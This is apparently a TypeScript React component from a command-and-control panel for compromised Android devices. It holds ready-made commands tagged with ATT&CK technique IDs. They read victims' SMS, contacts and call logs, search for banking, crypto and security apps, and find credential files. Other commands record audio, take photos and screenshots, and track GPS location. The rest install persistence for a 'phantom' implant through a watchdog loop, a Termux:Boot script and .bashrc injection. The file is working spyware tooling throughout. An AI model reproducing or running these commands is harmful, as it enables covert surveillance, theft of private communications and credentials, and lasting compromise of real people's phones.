import OSPanel from './OSPanel'
import type { OSConfig, Category } from './OSPanel'
import type { Session } from '../types'

const MODULES: Category[] = [
  {
    id: 'device', icon: '📱', label: 'DEVICE INFO', atkId: 'TA0007',
    cmds: [
      { icon: '📱', label: 'Model / Brand',          cmd: 'getprop ro.product.model; getprop ro.product.brand; getprop ro.product.manufacturer; getprop ro.product.name', tag: 'T1082' },
      { icon: '🤖', label: 'Android Version',        cmd: 'getprop ro.build.version.release; getprop ro.build.version.sdk; getprop ro.build.version.security_patch; getprop ro.build.id', tag: 'T1082' },
      { icon: '🔒', label: 'Security State',         cmd: 'getprop ro.crypto.state; getprop ro.boot.verifiedbootstate; getprop ro.boot.flash.locked; getprop ro.debuggable; getprop ro.build.tags', tag: 'T1082' },
      { icon: '⚙️', label: 'Hardware / SoC',         cmd: 'getprop ro.hardware; getprop ro.product.board; getprop ro.product.cpu.abi; getprop ro.product.cpu.abilist', tag: 'T1082' },
      { icon: '🔑', label: 'Android ID',             cmd: 'settings get secure android_id 2>&1', tag: 'T1033' },
      { icon: '📟', label: 'SIM / Carrier',          cmd: 'getprop gsm.operator.alpha; getprop gsm.network.type; getprop gsm.sim.state; getprop gsm.operator.iso-country', tag: 'T1033' },
      { icon: '🔋', label: 'Battery Status',         cmd: 'dumpsys battery 2>&1', tag: 'T1082' },
      { icon: '🧠', label: 'Memory Info',            cmd: 'cat /proc/meminfo 2>&1 | head -10', tag: 'T1082' },
      { icon: '💾', label: 'Storage Usage',          cmd: 'df /sdcard /data /system 2>&1', tag: 'T1082' },
      { icon: '👤', label: 'UID / SELinux Context',  cmd: 'id 2>&1; cat /proc/self/attr/current 2>&1; whoami 2>&1', tag: 'T1033' },
      { icon: '🌍', label: 'Locale / Language',      cmd: 'getprop persist.sys.locale; getprop ro.product.locale; settings get system locale 2>&1', tag: 'T1082' },
      { icon: '📋', label: 'All getprop',            cmd: 'getprop 2>&1', tag: 'T1082' },
    ],
  },
  {
    id: 'network', icon: '📡', label: 'NETWORK', atkId: 'TA0007',
    cmds: [
      { icon: '🌐', label: 'IP Addresses',           cmd: 'ip addr show 2>&1', tag: 'T1016' },
      { icon: '🛤️', label: 'Routing Table',         cmd: 'ip route show 2>&1', tag: 'T1016' },
      { icon: '🔌', label: 'DNS Servers',            cmd: 'getprop net.dns1; getprop net.dns2; getprop dhcp.wlan0.dns1', tag: 'T1016' },
      { icon: '📶', label: 'WiFi Status (cmd)',      cmd: 'cmd wifi status 2>&1', tag: 'T1016', note: 'Android 11+' },
      { icon: '🔗', label: 'TCP Connections',        cmd: 'cat /proc/net/tcp 2>&1 | head -30; cat /proc/net/tcp6 2>&1 | head -20', tag: 'T1049' },
      { icon: '🏠', label: 'Hosts File',             cmd: 'cat /system/etc/hosts 2>&1', tag: 'T1016' },
      { icon: '📡', label: 'Bluetooth State',        cmd: 'settings get global bluetooth_on 2>&1; cmd bluetooth_manager state 2>&1', tag: 'T1016' },
    ],
  },
  {
    id: 'apps', icon: '📦', label: 'APPS / PROCS', atkId: 'TA0007',
    cmds: [
      { icon: '📦', label: 'User Apps',              cmd: 'pm list packages -3 2>&1', tag: 'T1518' },
      { icon: '⚙️', label: 'System Apps',           cmd: 'pm list packages -s 2>&1 | head -60', tag: 'T1518' },
      { icon: '📂', label: 'App APK Paths',          cmd: 'pm list packages -f -3 2>&1 | head -40', tag: 'T1518' },
      { icon: '🏃', label: 'Running Processes',      cmd: 'ps -A 2>&1 | head -60 || ps 2>&1 | head -60', tag: 'T1057' },
      { icon: '🔄', label: 'Running Services',       cmd: 'dumpsys activity services 2>&1 | head -50', tag: 'T1007' },
      { icon: '🔍', label: 'Security Apps',          cmd: 'pm list packages 2>&1 | grep -i "security\\|antivirus\\|protect\\|kaspersky\\|norton\\|avast"', tag: 'T1518' },
      { icon: '🎯', label: 'Finance / Crypto Apps',  cmd: 'pm list packages 2>&1 | grep -i "bank\\|pay\\|crypto\\|coinbase\\|binance\\|wallet"', tag: 'T1518' },
      { icon: '💬', label: 'Messaging Apps',         cmd: 'pm list packages 2>&1 | grep -i "whatsapp\\|telegram\\|signal\\|viber\\|instagram\\|facebook"', tag: 'T1518' },
    ],
  },
  {
    id: 'comms', icon: '💬', label: 'COMMS', atkId: 'TA0009',
    cmds: [
      { icon: '📨', label: 'SMS Inbox',              cmd: 'content query --uri content://sms/inbox --projection address:body:date 2>&1 | head -100', tag: 'T1636', note: 'Needs READ_SMS' },
      { icon: '📤', label: 'SMS Sent',               cmd: 'content query --uri content://sms/sent --projection address:body:date 2>&1 | head -80', tag: 'T1636' },
      { icon: '👥', label: 'Contacts',               cmd: 'content query --uri content://contacts/phones/ --projection display_name:number 2>&1 | head -150', tag: 'T1636', note: 'Needs READ_CONTACTS' },
      { icon: '📞', label: 'Call Log',               cmd: 'content query --uri content://call_log/calls --projection number:date:type:duration 2>&1 | head -80', tag: 'T1636' },
      { icon: '📸', label: 'WhatsApp Media',         cmd: 'ls /sdcard/WhatsApp/Media 2>&1 || ls /sdcard/Android/media/com.whatsapp/WhatsApp/Media 2>&1', tag: 'T1636' },
      { icon: '✈️', label: 'Telegram Downloads',     cmd: 'ls /sdcard/Telegram 2>&1 || ls /sdcard/Android/data/org.telegram.messenger/files 2>&1', tag: 'T1636' },
    ],
  },
  {
    id: 'persist', icon: '🔒', label: 'PERSISTENCE', atkId: 'TA0003',
    cmds: [
      { icon: '🔍', label: 'Check Persistence',      cmd: 'ps 2>&1 | grep phantom | grep -v grep; cat /data/data/com.termux/files/home/.termux/boot/phantom.sh 2>&1; grep phantom /data/data/com.termux/files/home/.bashrc 2>&1', tag: 'T1398' },
      { icon: '🔄', label: 'Start Watchdog Loop',    cmd: 'nohup sh -c "while true; do /data/data/com.termux/files/home/phantom 2>/dev/null; sleep 15; done" > /dev/null 2>&1 & echo watchdog-started', tag: 'T1398' },
      { icon: '📦', label: 'Termux:Boot Script',     cmd: 'mkdir -p /data/data/com.termux/files/home/.termux/boot && printf "#!/data/data/com.termux/files/usr/bin/sh\\nnohup ~/phantom > /dev/null 2>&1 &\\n" > /data/data/com.termux/files/home/.termux/boot/phantom.sh && chmod +x /data/data/com.termux/files/home/.termux/boot/phantom.sh && echo boot-script-installed', tag: 'T1398' },
      { icon: '🏃', label: 'Inject .bashrc',         cmd: 'grep -q phantom /data/data/com.termux/files/home/.bashrc 2>/dev/null || echo "nohup ~/phantom > /dev/null 2>&1 &" >> /data/data/com.termux/files/home/.bashrc && echo bashrc-updated', tag: 'T1546' },
      { icon: '🧹', label: 'Remove All Persistence', cmd: 'pkill -f phantom 2>&1; rm -f /data/data/com.termux/files/home/.termux/boot/phantom.sh 2>&1; sed -i "/phantom/d" /data/data/com.termux/files/home/.bashrc 2>&1; echo removed', tag: 'T1070' },
    ],
  },
  {
    id: 'specops', icon: '🎯', label: 'SPEC OPS', atkId: 'TA0009',
    cmds: [
      { icon: '📍', label: 'GPS (Termux:API)',        cmd: 'termux-location --provider gps 2>&1 || echo needs-termux-api-app', tag: 'T1430' },
      { icon: '🗺️', label: 'Network Location',       cmd: 'termux-location --provider network 2>&1 || dumpsys location 2>&1 | head -30', tag: 'T1430' },
      { icon: '🎙️', label: 'Record Audio 10s',       cmd: 'termux-microphone-record -l 10 -f /sdcard/Download/rec.m4a 2>&1 && echo saved || echo needs-termux-api', tag: 'T1429' },
      { icon: '📷', label: 'Take Photo',              cmd: 'termux-camera-photo /sdcard/Download/photo.jpg 2>&1 && echo saved || echo needs-termux-api', tag: 'T1512' },
      { icon: '📸', label: 'Screenshot (screencap)',  cmd: 'screencap -p /sdcard/Download/screenshot.png 2>&1 && echo saved || echo failed', tag: 'T1513' },
      { icon: '💰', label: 'Find Cred Files',         cmd: 'find /sdcard -name "*.json" -o -name "*.conf" -o -name "*.key" 2>&1 | grep -i "auth\\|token\\|cred\\|pass\\|secret" | head -30', tag: 'T1552' },
      { icon: '🌐', label: 'Device Fingerprint',      cmd: 'echo === DEVICE ===; getprop ro.product.model; getprop ro.build.version.release; getprop ro.build.version.sdk; echo === NET ===; ip addr show | grep inet; echo === UID ===; id; echo === APPS ===; pm list packages -3 2>&1 | wc -l', tag: 'T1082' },
    ],
  },
]

function joinUnix(base: string, name: string) { return base.replace(/\/+$/, '') + '/' + name }
function parentUnix(p: string) {
  if (p === '/') return '/'
  const t = p.replace(/\/+$/, '')
  const i = t.lastIndexOf('/')
  return i <= 0 ? '/' : t.slice(0, i)
}

const CONFIG: OSConfig = {
  name:       'Android',
  icon:       '🤖',
  prompt:     '$',
  filter:     (s: Session) => s.os?.toLowerCase().includes('android') || s.arch?.toLowerCase().includes('arm'),
  modules:    MODULES,
  defaultFs:  '/sdcard',
  joinPath:   joinUnix,
  parentPath: parentUnix,
  quickCmds: [
    { icon: '📱', label: 'Model / Brand',  cmd: 'getprop ro.product.model; getprop ro.product.brand; getprop ro.product.manufacturer' },
    { icon: '🤖', label: 'Android Ver',    cmd: 'getprop ro.build.version.release; getprop ro.build.version.sdk; getprop ro.build.version.security_patch' },
    { icon: '🔋', label: 'Battery',        cmd: 'dumpsys battery 2>&1' },
    { icon: '🌐', label: 'IP / Network',   cmd: 'ip addr show 2>&1; ip route show 2>&1' },
    { icon: '📦', label: 'User Apps',      cmd: 'pm list packages -3 2>&1' },
    { icon: '🏃', label: 'Processes',      cmd: 'ps -A 2>&1 | head -40 || ps 2>&1 | head -40' },
    { icon: '💾', label: 'Storage',        cmd: 'df /sdcard /data /system 2>&1' },
    { icon: '👤', label: 'UID / Context',  cmd: 'id 2>&1; cat /proc/self/attr/current 2>&1' },
  ],
}

interface Props { onOpenTerminal: (id: string, name?: string) => void }
export default function Android({ onOpenTerminal }: Props) {
  return <OSPanel config={CONFIG} onOpenTerminal={onOpenTerminal} />
}
